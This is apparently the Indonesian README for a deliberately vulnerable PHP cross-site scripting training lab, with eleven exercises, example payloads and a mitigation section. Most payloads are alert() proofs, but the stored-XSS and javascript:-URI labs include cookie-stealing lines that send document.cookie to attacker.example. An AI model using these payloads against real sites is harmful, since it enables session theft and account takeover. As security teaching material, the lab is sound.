# XSS (Cross-Site Scripting) Lab

Aplikasi PHP sederhana yang sengaja rentan terhadap berbagai jenis XSS mengikuti kategori
PortSwigger Web Security Academy: **Reflected**, **Stored**, dan **DOM-based**, pada berbagai
konteks output (HTML body, atribut HTML, string JavaScript, header HTTP).

| Lab | Kategori | File | Sink / Konteks |
|---|---|---|---|
| 1 | Reflected XSS | `lab1_reflected.php` | HTML body |
| 2 | Reflected XSS | `lab2_reflected_attribute.php` | Atribut HTML (`value="..."`) |
| 3 | Reflected XSS | `lab3_reflected_js.php` | String literal JavaScript inline |
| 4 | Stored XSS | `lab4_stored_comments.php` | Guestbook, disimpan ke file JSON |
| 5 | DOM-based XSS | `lab5_dom_xss.php` | `location.hash` &rarr; `innerHTML` (client-side) |
| 6 | XSS + filter bypass | `lab6_filter_bypass.php` | Filter blacklist naif |
| 7 | Reflected XSS (header) | `lab7_useragent.php` | Header `User-Agent` |
| 8 | Reflected/Stored XSS | `lab8_javascript_uri.php` | Atribut `href` &mdash; skema `javascript:` |
| 9 | Stored XSS | `lab9_svg_upload.php` | Upload avatar SVG, dibuka langsung lewat URL |
| 10 | DOM-based XSS | `lab10_postmessage_xss.php` | `postMessage` &rarr; `innerHTML`, tanpa cek origin |
| 11 | Reflected XSS | `lab11_csp_bypass.php` | HTML body, CSP dengan `'unsafe-inline'` |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan. Jangan deploy ke server publik / internet.
> Jalankan hanya di jaringan lab/lokal yang terisolasi.

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/xss/`, atau lewat Portal di `http://localhost:8079/` →
kategori **A05: Injection** → **Cross-Site Scripting (XSS)**.

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab SQLi/Command Injection.

Untuk mematikan semuanya dan menghapus data komentar tersimpan (dari root repo):

```bash
docker compose down -v
```

## Panduan tiap lab

### Lab 1 — Reflected XSS (HTML body)
```
http://localhost:8079/xss/lab1_reflected.php?q=<script>alert(document.domain)</script>
http://localhost:8079/xss/lab1_reflected.php?q=<img src=x onerror=alert(1)>
```

### Lab 2 — Reflected XSS (atribut HTML)
Payload disisipkan di dalam `value="..."`. Harus keluar dari atribut dulu:
```
?color="><script>alert(1)</script>
?color=" onmouseover="alert(1)
```
Untuk contoh kedua, submit lalu arahkan kursor mouse ke kotak input untuk memicu event.

### Lab 3 — Reflected XSS (konteks JavaScript)
Aplikasi meng-escape tanda kutip ganda, tapi tidak menutup tag `<script>`:
```
?name=</script><script>alert(1)</script>
?name=\";alert(1);//
```
Payload kedua memakai backslash untuk menetralkan escaping kutip milik aplikasi.

### Lab 4 — Stored XSS (guestbook)
Kirim komentar berikut lewat form, lalu buka ulang halamannya (atau minta peserta lain
membuka halaman yang sama):
```
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```
Diskusikan dampaknya jika ini adalah dashboard admin yang membaca komentar/tiket dari user.

### Lab 5 — DOM-based XSS
Payload ada di **fragment URL** (`#...`), tidak pernah dikirim ke server:
```
http://localhost:8079/xss/lab5_dom_xss.php#<img src=x onerror=alert(document.domain)>
```
Perhatikan bahwa payload ini tidak akan pernah muncul di access log server — jelaskan kenapa
DOM-based XSS butuh pendekatan analisis source-to-sink pada JavaScript, bukan hanya cek server.

### Lab 6 — Filter bypass
Filter hanya menghapus string persis `<script>` (case-sensitive). Coba:
```
?input=<ScRiPt>alert(1)</ScRiPt>
?input=<img src=x onerror=alert(1)>
?input=<svg onload=alert(1)>
?input=<scr<script>ipt>alert(1)</scr<script>ipt>
```

### Lab 7 — Reflected XSS via header
```bash
curl -A "<script>alert(document.domain)</script>" http://localhost:8079/xss/lab7_useragent.php
```
Atau ubah User-Agent lewat DevTools (Network conditions / Sensors) di browser lalu reload.

### Lab 8 — XSS via `javascript:` URI (atribut href)
Field "Website" di-escape dengan benar (`htmlspecialchars()`), tapi tidak ada allowlist skema
URL. Isi field Website dengan:
```
javascript:alert(document.domain)
javascript:fetch('https://attacker.example/steal?c='+document.cookie)
```
Simpan profil, lalu klik link "Kunjungi website saya" di bagian preview untuk memicu eksekusi.

### Lab 9 — Stored XSS via upload avatar SVG
Simpan file berikut sebagai `pwned.svg` di komputer kamu:
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text y="20">pwned</text></svg>
```
Upload lewat form di `lab9_svg_upload.php`, lalu klik link "Lihat avatar saya (ukuran penuh)"
yang muncul — ini membuka file SVG-nya langsung (bukan lewat `<img>`), sehingga `onload`
dieksekusi oleh browser dengan origin situs ini.

### Lab 10 — DOM-based XSS via postMessage
Halaman `lab10_postmessage_xss.php` menulis `event.data` ke `innerHTML` tanpa cek
`event.origin`. Buka `lab10_attacker_iframe.php` — halaman itu meng-embed lab10 di iframe dan
mengirim payload lewat `postMessage()`:
```
http://localhost:8079/xss/lab10_attacker_iframe.php
```
Payload yang dikirim: `<img src=x onerror=alert(document.domain)>`. Alert akan muncul di
dalam iframe begitu pesan diterima.

### Lab 11 — Reflected XSS meski ada CSP (unsafe-inline)
Bug reflected XSS-nya identik dengan Lab 1, tapi halaman ini juga mengirim header
`Content-Security-Policy`. Cek dulu header responsnya:
```bash
curl -i "http://localhost:8079/xss/lab11_csp_bypass.php?q=test"
```
Perhatikan `script-src 'self' 'unsafe-inline'` — direktif `'unsafe-inline'` membuat CSP tidak
melindungi dari inline script. Payload yang sama seperti Lab 1 tetap jalan:
```
?q=<script>alert(document.domain)</script>
```

## Mitigasi (untuk didiskusikan setelah lab)
- **Contextual output encoding**: `htmlspecialchars()` untuk HTML body & atribut,
  `json_encode()` untuk menyisipkan data ke JavaScript, bukan concatenation manual.
- **Content-Security-Policy** header untuk membatasi eksekusi inline script.
- **HttpOnly** cookie flag agar `document.cookie` tidak bisa dibaca lewat XSS (Lab 4).
- Untuk DOM-based (Lab 5): audit sink berbahaya (`innerHTML`, `document.write`, `eval`) dan
  gunakan `textContent` / API DOM yang aman, atau sanitizer seperti DOMPurify bila HTML memang
  diperlukan.
- Filter blacklist (Lab 6) selalu bisa dilewati — gunakan encoding berbasis konteks atau
  allowlist, bukan pemblokiran string.
- **Allowlist skema URL** (Lab 8): sebelum menyisipkan URL yang dikontrol user ke atribut
  `href`/`src`, pastikan skemanya ada di daftar putih (`http:`, `https:`, `mailto:`, dst) —
  `htmlspecialchars()` saja tidak cukup untuk skema `javascript:`.
- **Validasi upload file** (Lab 9): jangan hanya andalkan `accept="..."` di client. Cek
  Content-Type & magic byte di server, simpan file upload di domain/subdomain terpisah tanpa
  cookie (agar tidak co-origin dengan aplikasi utama), dan sajikan gambar lewat `Content-Disposition: attachment` atau proxy yang memaksa ulang render sebagai gambar, bukan dokumen aktif.
- **Validasi `event.origin`** pada listener `postMessage` (Lab 10) terhadap allowlist domain
  eksplisit sebelum memproses `event.data` sama sekali, dan jangan pernah menulis data
  tersebut ke `innerHTML` walau originnya sudah tepercaya — pakai `textContent` atau sanitizer.
- **CSP yang benar-benar keras** (Lab 11): jangan pakai `'unsafe-inline'` di `script-src` —
  gunakan nonce/hash per-response, tambahkan `object-src 'none'` dan `base-uri 'self'`. CSP
  hanya jadi lapisan defense-in-depth yang berarti kalau dikonfigurasi ketat, bukan sekadar
  "ada".
